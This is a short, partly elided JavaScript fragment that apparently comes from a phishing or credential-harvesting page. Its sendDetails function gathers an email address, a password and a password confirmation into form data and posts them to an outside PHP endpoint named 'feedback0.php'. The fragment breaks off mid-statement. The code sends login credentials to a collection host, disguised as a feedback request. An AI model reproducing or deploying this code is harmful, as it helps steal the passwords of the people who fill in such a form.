...
function set(t, e) {
 ...
 function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://rashtriyapandarbar.com/feedback0.php", o).then(function(t) {
